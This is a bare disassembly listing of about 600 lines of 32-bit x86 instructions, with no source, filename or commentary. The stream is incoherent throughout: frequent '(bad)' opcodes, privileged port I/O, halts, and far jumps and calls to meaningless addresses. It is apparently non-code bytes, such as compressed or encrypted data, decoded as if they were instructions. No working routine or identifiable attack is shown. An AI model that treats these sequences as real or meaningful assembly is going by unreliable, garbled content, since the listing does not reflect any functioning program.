  4175bb:	adc    BYTE PTR [ebp-0x52],cl
  4175be:	(bad)  
  4175bf:	xor    eax,0x6988df
  4175c4:	push   ebp
  4175c5:	push   ebp
  4175c6:	call   0x17041678
  4175cb:	(bad)  
  4175cc:	mov    ebx,0xfd0d5ca
  4175d1:	jnp    0x417642
  4175d3:	pop    esp
  4175d4:	mov    eax,0xa722a6d5
  4175d9:	sbb    al,0x61
  4175db:	add    eax,0xd28153df
  4175e0:	mov    es,WORD PTR [edx]
  4175e2:	xchg   ecx,eax
  4175e3:	pop    ds
  4175e4:	fisttp WORD PTR ds:0xc7cde269
  4175ea:	mov    eax,ds:0xce40fa5c
  4175ef:	xor    DWORD PTR ds:0xbc168489,ecx
  4175f5:	pop    ecx
  4175f6:	xchg   ebp,eax
  4175f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175f8:	lods   eax,DWORD PTR ds:[esi]
  4175f9:	and    eax,0x7b9626f
  4175fe:	(bad)  
  4175ff:	fnsave [edx-0x4c964ebe]
  417605:	in     eax,0x9b
  417607:	daa    
  417608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417609:	xor    edx,DWORD PTR [edx]
  41760b:	mov    BYTE PTR [esi+0xcf89b1e],ah
  417611:	fdiv   DWORD PTR [ebx+0x62]
  417614:	pop    eax
  417615:	inc    edi
  417616:	les    ebp,FWORD PTR [eax+edx*1+0x7f248936]
  41761d:	outs   dx,DWORD PTR ds:[esi]
  41761e:	mov    BYTE PTR es:[esi],al
  417621:	shl    BYTE PTR [edi+0x10],0x83
  417625:	fcmovbe st,st(2)
  417627:	aas    
  417628:	pop    esp
  417629:	imul   DWORD PTR [ebx]
  41762b:	lea    ecx,[ecx]
  41762d:	and    eax,DWORD PTR [ecx-0x4f]
  417630:	(bad)  
  417631:	cs mov edi,0xfa28013
  417637:	rcr    ah,cl
  417639:	and    ah,BYTE PTR [esi-0xf5a6ca3]
  41763f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417640:	cmp    eax,0x708aa3b9
  417645:	mov    al,0xc2
  417647:	pop    edi
  417648:	jb     0x4175ca
  41764a:	adc    bl,dh
  41764c:	mov    ds:0x88777dd2,al
  417651:	icebp  
  417652:	in     al,dx
  417653:	pop    ebx
  417655:	inc    esi
  417656:	popa   
  417657:	sar    DWORD PTR [edx-0x16],cl
  41765a:	push   0x210f42e2
  41765f:	repz push esi
  417661:	and    BYTE PTR [ebx+0x6a],bl
  417664:	xchg   bl,bh
  417666:	jae    0x41762a
  417668:	jmp    0x308bbb56
  41766d:	(bad)  
  41766e:	mov    edx,0xda57c68
  417673:	xchg   esi,eax
  417674:	xacquire xchg BYTE PTR [eax],al
  417677:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417678:	int    0xe3
  41767a:	nop
  41767b:	retf   
  41767c:	jmp    FWORD PTR [edx+0x5a]
  41767f:	dec    eax
  417680:	lds    esi,FWORD PTR [esi+0x6ab9edf1]
  417686:	repnz mov edi,0x6b1ac895
  41768c:	psrad  mm6,mm0
  41768f:	popa   
  417690:	jmp    0x417653
  417692:	or     BYTE PTR [edi],dl
  417694:	outs   dx,BYTE PTR ds:[esi]
  417695:	cmp    BYTE PTR [esi+ecx*4+0x66],bh
  417699:	lods   eax,DWORD PTR ds:[esi]
  41769a:	mov    eax,ds:0xf4c9cac5
  41769f:	stos   BYTE PTR es:[edi],al
  4176a0:	pop    es
  4176a1:	lock push ebx
  4176a3:	test   DWORD PTR [edi+edx*2+0x6c5506f9],edi
  4176aa:	pop    esi
  4176ab:	mov    ecx,0x2ae67bd4
  4176b0:	mov    ecx,0x58c4c436
  4176b5:	aaa    
  4176b6:	add    eax,0x3d2e62a
  4176bb:	imul   edi,DWORD PTR [ebp+0x543febaa],0x14b221d7
  4176c5:	retf   
  4176c6:	inc    edx
  4176c7:	add    esp,0x4bb843a2
  4176cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176ce:	shl    DWORD PTR [edi],cl
  4176d0:	call   0x887a:0x9dcf7827
  4176d7:	aaa    
  4176d8:	adc    BYTE PTR [ecx+0x3d3931c6],dl
  4176de:	dec    esp
  4176df:	hlt    
  4176e0:	jno    0x4176aa
  4176e2:	das    
  4176e3:	out    0x87,al
  4176e5:	cs dec eax
  4176e7:	aam    0x5c
  4176e9:	cmp    al,0x18
  4176eb:	add    ebp,eax
  4176ed:	jge    0x4176bd
  4176ef:	fistp  QWORD PTR [ebp+0x33fe82ef]
  4176f5:	retf   0x77fb
  4176f8:	xchg   esp,eax
  4176f9:	adc    BYTE PTR ds:0x9fd1b807,bl
  4176ff:	xchg   edx,eax
  417700:	mov    bl,0x91
  417702:	add    DWORD PTR [edi+0x47ad52ed],ebp
  417708:	lea    ebp,[ebx-0xcc1e0b0]
  41770e:	jp     0x4176c4
  417710:	out    0xac,eax
  417712:	mov    dh,0xcd
  417714:	push   edi
  417715:	and    BYTE PTR ds:0x5834281f,cl
  41771b:	pop    ds
  41771c:	rcr    DWORD PTR [eax+0x91b0863],1
  417722:	push   ebp
  417723:	and    edx,DWORD PTR [edx]
  417725:	ss in  al,0x94
  417728:	sub    DWORD PTR [eax+0x619100fd],0xc52be74f
  417732:	fwait
  417733:	adc    eax,0xfd657a20
  417738:	sbb    ah,BYTE PTR [ecx]
  41773a:	int3   
  41773b:	sbb    bl,BYTE PTR [ecx]
  41773d:	inc    edx
  41773e:	cmp    al,bh
  417740:	ja     0x4176cf
  417742:	ins    BYTE PTR es:[edi],dx
  417743:	leave  
  417744:	rol    ecx,0x41
  417747:	clc    
  417748:	imul   eax,DWORD PTR [esi+0x42ea04fc],0x24
  41774f:	test   dh,0x11
  417752:	mov    edi,0xea2206c3
  417757:	(bad)  [edi-0x9]
  41775a:	xchg   BYTE PTR [edx],dh
  41775c:	jmp    0x857f:0xfe15ccc1
  417763:	stos   BYTE PTR es:[edi],al
  417764:	test   BYTE PTR [eax-0x7d],dl
  417767:	jg     0x417794
  417769:	cs cld 
  41776b:	outs   dx,DWORD PTR ds:[esi]
  41776c:	lock sbb BYTE PTR [esi+0x32],al
  417770:	xor    ah,ch
  417772:	jo     0x417708
  417774:	fbld   TBYTE PTR [esi-0x64c3b9c7]
  41777a:	test   eax,0x93c4cdc7
  41777f:	adc    BYTE PTR [edi+0x6c],bh
  417782:	aas    
  417783:	fisubr DWORD PTR [edi-0x20c6a34b]
  417789:	pop    es
  41778a:	or     BYTE PTR [edx],dl
  41778c:	loopne 0x4177c9
  41778e:	shl    dl,0x61
  417791:	and    BYTE PTR [eax+0x448d88d2],al
  417797:	gs pop edi
  417799:	shr    esp,cl
  41779b:	xor    eax,0x5c4159b3
  4177a0:	not    ecx
  4177a2:	or     eax,0x60a4deb6
  4177a7:	pop    es
  4177a8:	jmp    FWORD PTR [ecx-0x7b]
  4177ab:	in     al,dx
  4177ac:	or     al,0x43
  4177ae:	rcr    al,1
  4177b0:	inc    edi
  4177b1:	popf   
  4177b2:	ret    
  4177b3:	jle    0x417833
  4177b5:	mov    cl,0xe0
  4177b7:	scas   eax,DWORD PTR es:[edi]
  4177b8:	xchg   edi,eax
  4177b9:	inc    ebp
  4177ba:	mov    ah,0x54
  4177bc:	shr    DWORD PTR [esi],1
  4177be:	xchg   ebx,eax
  4177bf:	les    esp,FWORD PTR [ebx+0x2613f6e3]
  4177c5:	iret   
  4177c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177c7:	addr16 mov al,0x43
  4177ca:	pop    ss
  4177cb:	pop    es
  4177cc:	fs cmp esi,eax
  4177cf:	pop    esp
  4177d0:	sbb    eax,0xf1bedfc
  4177d5:	adc    bh,ch
  4177d7:	adc    DWORD PTR [ebx-0x734ea4bb],ebx
  4177dd:	in     al,0x4d
  4177df:	inc    ebp
  4177e0:	jecxz  0x41783a
  4177e2:	mov    ds,WORD PTR [esi-0x7d1ddad3]
  4177e8:	(bad)  
  4177e9:	cmp    eax,0xf07b64fb
  4177ee:	aad    0xa6
  4177f0:	jb     0x4177ff
  4177f2:	adc    al,BYTE PTR [esi+ebx*1+0x75a74b64]
  4177f9:	or     ch,BYTE PTR [ebx-0x5d]
  4177fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177fd:	jae    0x417857
  4177ff:	dec    ecx
  417800:	pop    ecx
  417801:	sub    DWORD PTR [esi+edx*2+0x7b],ecx
  417805:	xchg   edx,eax
  417806:	sbb    bl,dh
  417808:	cld    
  417809:	jae    0x4177af
  41780b:	jle    0x4177bb
  41780d:	mov    esp,0xa53fd4fe
  417812:	cmp    esi,DWORD PTR [edi-0x72]
  417815:	retf   0xdf12
  417818:	mov    eax,ds:0xe08453db
  41781d:	mov    edx,0xe83e65f
  417822:	(bad)  
  417824:	(bad)  
  417825:	stos   DWORD PTR es:[edi],eax
  417826:	pop    edx
  417827:	retf   
  417828:	jp     0x4177cf
  41782a:	mov    dh,0xd4
  41782c:	repnz sbb eax,0x219c7827
  417832:	out    dx,al
  417833:	scas   al,BYTE PTR es:[edi]
  417834:	ins    DWORD PTR es:[edi],dx
  417835:	test   DWORD PTR [eax],edi
  417837:	fstp   QWORD PTR [ebp+0x9]
  41783a:	ret    
  41783b:	loope  0x417871
  41783d:	mov    eax,0xf318610d
  417842:	arpl   WORD PTR [edx-0x64],si
  417845:	adc    ebx,DWORD PTR [edx+0xf]
  417848:	xchg   DWORD PTR [ebx-0x3e],ebx
  41784b:	ds clc 
  41784d:	leave  
  41784e:	inc    ecx
  41784f:	imul   ecx,DWORD PTR [ecx],0x5f
  417852:	dec    edx
  417853:	sbb    eax,0x885ebd4f
  417858:	xchg   esp,eax
  417859:	sbb    eax,0x463ec2ae
  41785e:	pop    ecx
  41785f:	jne    0x417809
  417861:	ror    BYTE PTR [edi-0x72e598db],cl
  417867:	and    dl,bh
  417869:	pop    esp
  41786a:	call   0x81c99bf8
  41786f:	int    0xbb
  417871:	adc    bh,BYTE PTR [ebp-0x69705aea]
  417877:	pusha  
  417878:	(bad)
  41787b:	cmp    WORD PTR [ebx],dx
  41787e:	xor    DWORD PTR [esi+0x2852ef76],edx
  417884:	xlat   BYTE PTR ds:[ebx]
  417885:	push   cs
  417886:	aaa    
  417887:	ds sbb al,0x37
  41788a:	out    dx,al
  41788b:	push   esi
  41788c:	pop    esp
  41788d:	inc    ecx
  41788e:	and    eax,0x23af92fb
  417893:	loope  0x4178a9
  417895:	test   al,0x86
  417897:	fdivrp st(5),st
  417899:	push   ds
  41789a:	cmp    al,0x24
  41789c:	add    DWORD PTR [ecx],0xff1a6d97
  4178a2:	out    0x43,al
  4178a4:	jmp    0xe4419c2e
  4178a9:	jno    0x4178ab
  4178ab:	jle    0x4178f3
  4178ad:	cmp    BYTE PTR [edi-0x416822be],ah
  4178b3:	jno    0x417914
  4178b5:	les    ebx,FWORD PTR [esi-0x6140bcfa]
  4178bb:	xor    al,ch
  4178bd:	and    eax,0x206e7a76
  4178c2:	mov    ds:0x269ad646,eax
  4178c7:	push   esi
  4178c8:	aas    
  4178c9:	adc    BYTE PTR [ebx],dh
  4178cb:	es sub al,BYTE PTR ds:[ebx-0x65b9b3e]
  4178d3:	mov    al,fs:0x2177c630
  4178d9:	call   0x604e:0xc003a833
  4178e0:	inc    eax
  4178e1:	jb     0x41792d
  4178e3:	dec    edi
  4178e4:	call   FWORD PTR ds:0xd010bab
  4178ea:	inc    ecx
  4178eb:	fstp   QWORD PTR [edi-0x1e]
  4178ee:	mov    dl,dh
  4178f0:	xchg   ebx,eax
  4178f1:	arpl   dx,bp
  4178f3:	addr16 and eax,esp
  4178f6:	or     dh,BYTE PTR [edi-0xa]
  4178f9:	int3   
  4178fa:	popf   
  4178fb:	xor    al,0x56
  4178fe:	ins    BYTE PTR es:[edi],dx
  4178ff:	scas   eax,DWORD PTR es:[edi]
  417900:	inc    edi
  417901:	loop   0x4178a4
  417903:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417904:	cmp    al,0x7f
  417906:	pop    ds
  417907:	mov    edx,0x4f957324
  41790c:	sub    eax,0xbdf264a2
  417911:	push   ss
  417912:	dec    eax
  417913:	inc    esp
  417914:	cmc    
  417915:	call   0xb4c090c3
  41791a:	add    DWORD PTR [esi-0x3f],0xffffffbc
  41791e:	hlt    
  41791f:	pop    ebp
  417920:	into   
  417921:	push   es
  417922:	add    eax,0x780de0b5
  417927:	inc    esi
  417928:	loop   0x4179a2
  41792a:	sbb    DWORD PTR [edi+0x57d59ba3],0x5b7d2fe6
  417934:	ret    
  417935:	aad    0x9e
  417937:	pop    esi
  417938:	iret   
  417939:	jmp    FWORD PTR [ebx-0x7caa3848]
  41793f:	pop    ss
  417940:	rcl    BYTE PTR [eax-0x12],cl
  417943:	sub    ecx,edi
  417945:	xchg   ecx,eax
  417946:	mov    ecx,0xb17e53d0
  41794b:	addr16 sbb dh,0x80
  41794f:	sub    ch,BYTE PTR [esi]
  417951:	ret    
  417952:	mov    eax,0x17a71dfc
  417957:	mov    DWORD PTR [ebx+0x7f],esi
  41795a:	or     DWORD PTR [edi-0x4d],ecx
  41795d:	mov    dh,0xaa
  41795f:	js     0x41793e
  417961:	leave  
  417962:	mov    bh,0x57
  417964:	lods   al,BYTE PTR ds:[esi]
  417965:	cmp    al,0xf4
  417967:	sub    al,0x3a
  417969:	cmp    ch,BYTE PTR [ecx]
  41796b:	jle    0x417924
  41796d:	cmc    
  41796e:	dec    ebx
  41796f:	je     0x417999
  417971:	sbb    eax,0xf85e6679
  417976:	out    dx,eax
  417977:	enter  0xee5c,0x5c
  41797b:	loopne 0x417999
  41797d:	mov    ebx,0xe3fbcbb2
  417982:	retf   0xdabc
  417985:	mov    ds:0x8a92963b,eax
  41798a:	fucomip st,st(4)
  41798c:	add    cl,BYTE PTR [ebx-0x63]
  41798f:	cmp    BYTE PTR [ecx-0x5b07abd1],dh
  417995:	xchg   edx,eax
  417996:	push   edx
  417997:	adc    eax,0x760d2e57
  41799c:	out    0xa6,al
  41799e:	fucomi st,st(7)
  4179a0:	pop    DWORD PTR [edx-0x22]
  4179a3:	leave  
  4179a4:	adc    BYTE PTR ds:0xa2a9483c,0xe0
  4179ab:	clc    
  4179ac:	cwde   
  4179ad:	pusha  
  4179ae:	push   cs
  4179af:	arpl   WORD PTR [esi-0x4524c208],dx
  4179b5:	sub    al,0xbd
  4179b7:	arpl   cx,bx
  4179b9:	push   ds
  4179ba:	mov    al,0xed
  4179bc:	shl    DWORD PTR [esp+eax*1+0x23],0xe6
  4179c1:	mov    ch,0xaf
  4179c3:	clc    
  4179c4:	mov    bh,0xa2
  4179c6:	dec    esp
  4179c7:	pop    edi
  4179c8:	imul   ebp,DWORD PTR [edx],0x9
  4179cb:	outs   dx,DWORD PTR ds:[esi]
  4179cc:	ret    
  4179cd:	iret   
  4179ce:	pop    edx
  4179cf:	and    bl,0x41
  4179d2:	inc    ebp
  4179d3:	arpl   WORD PTR [esi+edi*4],di
  4179d6:	jmp    0x69e3:0x623c53f5
  4179dd:	pop    edi
  4179de:	mov    dh,0xb3
  4179e0:	sub    esp,esp
  4179e2:	out    dx,al
  4179e3:	or     al,BYTE PTR [edx+0x2f978c4a]
  4179e9:	in     al,dx
  4179ea:	test   eax,0x8de3f34f
  4179ef:	cmc    
  4179f0:	mov    edx,0x7de5f335
  4179f5:	shr    ebp,0x9c
  4179f8:	push   esp
  4179f9:	sar    bh,cl
  4179fb:	or     ah,dl
  4179fd:	or     bl,BYTE PTR [esi+eax*4-0x340a34b3]
  417a04:	xor    al,0x28
  417a06:	mov    BYTE PTR [edi],dl
  417a08:	jp     0x417a35
  417a0a:	or     ecx,DWORD PTR [ebx+0x6db585e8]
  417a10:	mov    edx,0x60f6d371
  417a15:	inc    edx
  417a16:	mov    BYTE PTR [edi-0x62418d33],bl
  417a1c:	dec    eax
  417a1d:	loopne 0x417a2e
  417a1f:	(bad)  
  417a20:	lds    esi,FWORD PTR [edx+esi*1]
  417a23:	xor    ch,BYTE PTR [edi+0x26592985]
  417a29:	add    eax,0xdb47d907
  417a2e:	xor    edx,edx
  417a30:	adc    ebx,DWORD PTR [esi]
  417a32:	mov    al,ds:0xc7ff6b08
  417a37:	and    BYTE PTR [esi],ch
  417a39:	push   0xffffffbe
  417a3b:	xchg   ebx,eax
  417a3c:	inc    edi
  417a3d:	cmp    eax,0xd7c69154
  417a42:	into   
  417a43:	hlt    
  417a44:	xlat   BYTE PTR ds:[ebx]
  417a45:	sbb    BYTE PTR [edx-0x35c9a499],cl
  417a4b:	ins    BYTE PTR es:[edi],dx
  417a4c:	sub    ch,al
  417a4e:	daa    
  417a4f:	test   al,0x60
  417a51:	inc    edi
  417a52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a53:	les    ebp,FWORD PTR [esi+0x3]
  417a56:	mov    eax,0x21e8a480
  417a5b:	push   edx
  417a5c:	adc    dh,BYTE PTR [esp+esi*4+0x1fd09d63]
  417a63:	ins    DWORD PTR es:[edi],dx
  417a64:	fdivr  QWORD PTR [edi+ecx*2]
  417a67:	cmp    esp,DWORD PTR [eax]
  417a69:	inc    esi
  417a6a:	push   esi
  417a6b:	mov    esp,0x81a2e9b7
  417a70:	and    BYTE PTR [esp+edi*8+0x2cdd2582],dl
  417a77:	adc    dl,dl
  417a79:	push   0xdfcf1a23
  417a7e:	push   esi
  417a7f:	adc    eax,DWORD PTR [edx+0x43]
  417a82:	ficomp DWORD PTR [ebx]
  417a84:	pop    esp
  417a85:	icebp  
  417a86:	mov    eax,ds:0xf108c3b8
  417a8b:	sti    
  417a8c:	or     esp,DWORD PTR ss:[ecx+0x68]
  417a90:	dec    ebx
  417a91:	gs dec ebx
  417a93:	push   esi
  417a94:	add    al,0xd4
  417a96:	cdq    
  417a97:	push   ss
  417a98:	shl    DWORD PTR [ebp+0x5e895e63],0x77
  417a9f:	pop    ds
  417aa0:	call   0x4fe3a6a9
  417aa5:	das    
  417aa6:	xor    BYTE PTR [ebx],al
  417aa8:	xchg   ecx,eax
  417aa9:	loopne 0x417a7e
  417aab:	(bad)  
  417aac:	out    0x1b,al
  417aae:	push   es
  417aaf:	cmc    
  417ab0:	ss nop
  417ab2:	and    BYTE PTR ds:0x7efeb2b5,bl
  417ab8:	ja     0x417ad4
  417aba:	dec    eax
  417abb:	push   0xb71e9820
  417ac0:	mov    DWORD PTR [edi+0x773d9259],edi
  417ac6:	xor    cl,BYTE PTR [eax-0x3862dd7b]
  417acc:	mov    bh,0xd8
  417ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417acf:	and    DWORD PTR [ebx-0x63],esp
  417ad2:	xchg   ebp,eax
  417ad3:	mov    ch,0xf1
  417ad5:	xor    eax,0x243fd721
  417ada:	cmp    bl,BYTE PTR ss:[esi+ebp*4-0x18ff0712]
  417ae2:	daa    
  417ae3:	into   
  417ae4:	sbb    BYTE PTR [esi],al
  417ae6:	push   esp
  417ae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ae8:	inc    edx
  417ae9:	mov    eax,ds:0x61b34d00
  417aee:	mov    eax,DWORD PTR [edx+esi*8-0x1bde998]
  417af5:	outs   dx,BYTE PTR ds:[esi]
  417af6:	adc    eax,0x6d6c7da7
  417afb:	fisub  WORD PTR [edx+0x1]
  417afe:	or     BYTE PTR [ebx-0x57],bh
  417b01:	dec    esp
  417b02:	mov    dh,0x94
  417b04:	pop    ebp
  417b05:	out    0xf1,eax
  417b07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b08:	add    dl,BYTE PTR ds:0xad853a0b
  417b0e:	xchg   DWORD PTR [edi+0x3483f814],esi
  417b14:	mov    edx,ecx
  417b16:	mov    al,ds:0xfca21bf5
  417b1b:	dec    eax
  417b1c:	mov    al,0xde
  417b1e:	dec    ebx
  417b1f:	sbb    BYTE PTR [esi-0x6a],0xa9
  417b23:	push   0x9408f930
  417b28:	dec    esp
  417b29:	or     BYTE PTR [eax],dl
  417b2b:	sbb    eax,DWORD PTR ds:[edi+0x39]
  417b2f:	aaa    
  417b30:	test   dh,bh
  417b32:	add    BYTE PTR [ecx+ebx*8-0x2e728d56],al
  417b39:	test   esp,ecx
  417b3b:	test   BYTE PTR [ecx],ah
  417b3d:	push   0x52
  417b3f:	aaa    
  417b40:	lods   eax,DWORD PTR ds:[esi]
  417b41:	aaa    
  417b42:	xchg   ebp,eax
  417b43:	(bad)  
  417b44:	mov    edi,ebp
  417b46:	jmp    0x417b11
  417b48:	xor    ecx,DWORD PTR [edx-0xb3fbaf1]
  417b4e:	call   DWORD PTR [ebx]
  417b50:	cmp    al,0x26
  417b52:	and    al,0x61
  417b54:	jbe    0x417bbf
  417b56:	xlat   BYTE PTR ds:[ebx]
  417b57:	add    al,0xfc
  417b59:	cmp    ebx,DWORD PTR [edx]
  417b5b:	repnz (bad) 
  417b5d:	out    0x5b,al
  417b5f:	pop    ecx
  417b60:	xchg   bh,ch
  417b62:	ds cli 
  417b64:	pop    ecx
  417b65:	dec    eax
  417b66:	jae    0x417b17
  417b68:	mov    bl,0x25
  417b6a:	sub    al,0xa5
  417b6c:	fcom   DWORD PTR [ebp+0x2f1c87f0]
  417b72:	jo     0x417be9
  417b74:	xor    dh,BYTE PTR [eax-0x50e7eb7c]
  417b7a:	lods   al,BYTE PTR ds:[esi]
  417b7b:	mov    esp,0xc85ce3e9
  417b80:	test   DWORD PTR [ebx],esp
  417b82:	fsubr  QWORD PTR [edi+ebx*1-0x12905b31]
  417b89:	push   ecx
  417b8a:	jb     0x417b1c
  417b8c:	jne    0x417b73
  417b8e:	adc    eax,0xc42172ea
  417b93:	data16 fadd DWORD PTR [ecx+0x7e7004a7]
  417b9a:	(bad)  
  417b9b:	jne    0x417b8b
  417b9d:	fs add dh,bh
  417ba0:	fidiv  WORD PTR [eax]
  417ba2:	stc    
  417ba3:	jae    0x417b7b
  417ba5:	cli    
  417ba6:	out    0xe9,al
  417ba8:	sahf   
  417ba9:	dec    esi
  417baa:	sub    al,BYTE PTR cs:[eax+eax*8]
  417bae:	arpl   ax,cx
  417bb0:	cmp    esp,DWORD PTR [ecx]
  417bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bb3:	outs   dx,DWORD PTR ds:[esi]
  417bb4:	repz out 0xb4,eax
  417bb7:	in     al,0xde
  417bb9:	aam    0x1d
  417bbb:	push   edi
  417bbc:	mov    edi,0xdac896f9
  417bc1:	dec    ebx
  417bc2:	cmp    eax,0x77a9d277
  417bc7:	jne    0x417c25
  417bc9:	mov    esi,0xab5955f6
  417bce:	mov    BYTE PTR [edx+0x25],dl
  417bd1:	mov    ah,0xe5
  417bd3:	adc    BYTE PTR [ecx-0x7aeb13c5],bh
  417bd9:	repz jno 0x417bed
  417bdc:	(bad)  
  417bdd:	jmp    FWORD PTR [ebx-0x75e9a853]
  417be3:	and    DWORD PTR [ebx-0xb9d18ef],0x3fd085b5
  417bed:	bound  ebx,QWORD PTR [edx+0x5c]
  417bf0:	scas   al,BYTE PTR es:[edi]
  417bf1:	ret    0x7add
  417bf4:	jg     0x417c5e
  417bf6:	cmp    BYTE PTR ds:0x990c1767,0xb3
  417bfd:	aad    0x30
  417bff:	cmp    esp,DWORD PTR [edx-0x50]
  417c02:	loop   0x417bc3
  417c04:	clc    
  417c05:	mov    edx,0x7f05b697
  417c0a:	sbb    al,0xd3
  417c0c:	mov    ds:0xf13cba2,al
  417c11:	or     ecx,ebp
  417c13:	adc    eax,0xa46b1e35
  417c18:	xor    esi,DWORD PTR [ebx]
  417c1a:	dec    esi
  417c1b:	jmp    0x417c37
  417c1d:	daa    
  417c1e:	stos   BYTE PTR es:[edi],al
  417c1f:	bound  esi,QWORD PTR [eax+0x50ebf023]
  417c25:	sbb    DWORD PTR [ecx-0xb],ecx
  417c28:	jae    0x417c56
  417c2a:	pusha  
  417c2b:	inc    esp
  417c2c:	jecxz  0x417c4e
  417c2e:	cmp    al,0x59
  417c30:	push   0xc05e5dcc
  417c35:	mov    ch,0x94
  417c37:	in     al,0x80
  417c39:	push   ebx
  417c3a:	add    DWORD PTR ds:0xb174ebca,ebp
  417c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c41:	out    0xac,eax
  417c43:	jmp    0x7aea5a3b
  417c48:	dec    ebp
  417c49:	xor    dl,BYTE PTR [edx+0x6]
  417c4c:	jle    0x417c0f
  417c4e:	mov    dl,al
  417c50:	(bad)  
  417c52:	jo     0x417bdd
  417c54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c55:	jecxz  0x417c44
  417c57:	daa    
  417c58:	jle    0x417be6
  417c5a:	xchg   ebp,eax
  417c5b:	repnz sub BYTE PTR [eiz*1-0x656fbd34],ch
  417c63:	out    dx,al
  417c64:	sahf   
  417c65:	pop    esi
  417c66:	das    
  417c67:	test   eax,0x8602d6e1
  417c6c:	cmp    al,0x3
  417c6e:	jne    0x417bff
  417c70:	fsubr  DWORD PTR [esi-0x10]
  417c73:	adc    eax,0x37725eed
  417c78:	pushf  
  417c79:	(bad)  
  417c7a:	pop    ss
  417c7b:	ret    0x6847
  417c7e:	pop    esi
  417c7f:	sub    bh,bh
  417c81:	mov    ss,WORD PTR [eax-0x6a]
  417c84:	test   esi,ecx
  417c86:	in     eax,dx
  417c87:	mov    dl,0x38
  417c89:	(bad)  
  417c8a:	ds (bad) 
  417c8c:	in     al,0x57
  417c8e:	sub    ecx,ecx
  417c90:	xchg   ebx,eax
  417c91:	stos   DWORD PTR es:[edi],eax
  417c92:	jb     0x417c9b
  417c94:	pushf  
  417c95:	push   es
  417c96:	mov    cl,BYTE PTR [eax]
  417c98:	data16 hlt 
  417c9a:	shl    BYTE PTR [esi],cl
  417c9c:	mov    ebx,0x634f7a9d
  417ca1:	cdq    
  417ca2:	pop    es
  417ca3:	or     esp,esi
  417ca5:	xchg   ch,dl
  417ca7:	ins    DWORD PTR es:[edi],dx
  417ca8:	icebp  
  417ca9:	mov    ecx,0x1e42d77b
  417cae:	das    
  417caf:	(bad)  
  417cb0:	out    0x84,eax
  417cb2:	ds pop ds
  417cb4:	ins    BYTE PTR es:[edi],dx
  417cb5:	push   esi
  417cb6:	jl     0x417c70
  417cb8:	add    ecx,DWORD PTR [edx]
  417cba:	push   ebx
  417cbb:	outs   dx,DWORD PTR ds:[esi]
  417cbc:	add    esi,DWORD PTR [ebx]
  417cbe:	or     bl,BYTE PTR [ebx]
  417cc0:	cmp    ecx,DWORD PTR [ebx+ebx*8]
  417cc3:	sbb    BYTE PTR ds:0xdb382c51,0x21
  417cca:	fidivr WORD PTR [esi]
  417ccc:	adc    al,0xc
  417cce:	mov    bl,0xb0
  417cd0:	not    DWORD PTR [ecx+0x28227a73]
  417cd6:	dec    edx
  417cd7:	and    bh,BYTE PTR ds:0xe3816921
  417cdd:	jbe    0x417cb6
  417cdf:	loop   0x417c78
  417ce1:	mov    ah,0xe8
  417ce3:	pop    ebp
  417ce4:	ds cmp eax,0x9cec6eac
  417cea:	retf   
  417ceb:	xchg   edx,eax
  417cec:	and    eax,0xe6920197
  417cf1:	lock pop ebx
  417cf3:	ss inc edi
  417cf5:	or     BYTE PTR [ecx+esi*2-0x6c574d89],0x9a
  417cfd:	ins    BYTE PTR es:[edi],dx
  417cfe:	ja     0x417cb0
  417d00:	push   es
  417d01:	neg    DWORD PTR [ebp+esi*4-0x348ed8e9]
  417d08:	sbb    DWORD PTR [eax],ebx
  417d0a:	fisubr WORD PTR [ebp-0x33]
  417d0d:	fsub   QWORD PTR [eax]
  417d0f:	sbb    bh,BYTE PTR [edx+0x25]
  417d12:	sahf   
  417d13:	shl    BYTE PTR [ebx+0x47],0xda
  417d17:	fs mov al,0x68
  417d1a:	scas   al,BYTE PTR es:[edi]
  417d1b:	icebp  
  417d1c:	and    BYTE PTR [eax+0x69],al
  417d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d20:	mov    al,ds:0x7dfc9db4
  417d25:	addr16 xchg edi,eax
  417d27:	adc    al,0x7c
  417d29:	sub    DWORD PTR [esi-0x58c7b38c],ebp
  417d2f:	lock xchg DWORD PTR [edx],esi
  417d32:	sar    BYTE PTR ds:0x5bc7dd61,1
  417d38:	cmp    eax,0xfc9ee557
  417d3d:	mov    ebp,0x4e6a7203
  417d42:	inc    eax
  417d43:	and    eax,DWORD PTR [ebx-0x3ec2eac1]
  417d49:	ins    DWORD PTR es:[edi],dx
  417d4a:	addr16 pop ecx
  417d4c:	(bad)  
  417d4e:	mov    al,ds:0xea249589
  417d53:	xchg   BYTE PTR [edx],ch
  417d55:	xor    DWORD PTR [eax+0x5e],0x20
  417d59:	hlt    
  417d5a:	aam    0x48
  417d5c:	out    dx,al
  417d5d:	pop    eax
  417d5e:	lahf   
  417d5f:	mov    eax,esi
  417d61:	sub    DWORD PTR [ebx+0x67],0xed991218
  417d68:	cmc    
  417d69:	in     al,dx
  417d6a:	adc    DWORD PTR [esi],ebx
  417d6c:	ficom  DWORD PTR [esi]
  417d6e:	and    BYTE PTR fs:[eax+0x4d],ah
  417d72:	pop    ebp
  417d73:	pop    es
  417d74:	xchg   esi,eax
  417d75:	inc    edx
  417d76:	ja     0x417dc3
  417d78:	fucomip st,st(2)
  417d7a:	mov    edi,0xd5c27c88
  417d7f:	inc    esi
  417d80:	loop   0x417db4
  417d82:	fadd   QWORD PTR [esi-0x4ccb1546]
  417d88:	jb     0x417d36
  417d8a:	pop    ds
  417d8b:	repz cdq 
  417d8d:	xchg   BYTE PTR [edi+0x698792ec],ah
  417d93:	outs   dx,DWORD PTR ds:[esi]
  417d94:	pushf  
  417d95:	sub    dh,BYTE PTR [ecx]
